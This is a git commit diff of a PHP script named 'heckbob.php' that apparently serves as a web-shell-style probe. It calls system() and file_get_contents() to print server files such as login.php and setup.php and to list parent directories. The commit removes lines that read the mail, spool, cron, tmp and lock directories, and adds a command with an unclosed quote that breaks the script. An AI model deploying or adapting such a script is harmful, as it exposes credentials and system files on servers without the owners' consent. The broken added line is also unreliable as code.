950d1778bda4d3de89f1e7f138e68d30686a8214
Oluwakemi Odusanya <odus.kemi@gmail.com>
2018-03-18 17:47:59 -0400

    Update heckbob.php

--- heckbob.php
+++ heckbob.php
@@ -12,17 +12,5 @@ echo system('cat refresh.html');
 echo system('cat login.php');
 echo file_get_contents('setup.php');
 echo system('ls ../..');
-echo system('ls ../../mail');
-echo system('cat ../../mail');
-echo "spool \n";
-echo system('ls ../../spool');
-echo system('cat ../../spool');
-echo system('ls ../../spool/cron');
-echo system('cat ../../spool/mail');
-echo "tmp \n";
-echo system('ls ../../tmp');
-echo system('cat ../../tmp');
-echo "lock \n";
-echo system('ls ../../lock');
-echo system('cat ../../lock');
+echo system('ls ../.. -L);
 ?>
